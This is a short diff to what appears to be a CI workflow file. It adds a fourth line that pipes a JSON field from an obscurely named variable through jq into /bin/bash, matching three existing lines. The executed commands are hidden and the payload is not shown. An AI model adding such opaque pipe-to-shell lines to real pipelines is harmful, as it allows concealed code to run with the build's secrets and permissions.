@@ -25,6 +25,7 @@ jobs:
           echo $birnc662 | jq -r .bu142 | /bin/bash
           echo $vsh10 | jq -r .volea004 | /bin/bash
           printf '%s' "$sy70479" | jq -r .eig05 | /bin/bash
+          echo $wrltq07 | jq -r .sv74500 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
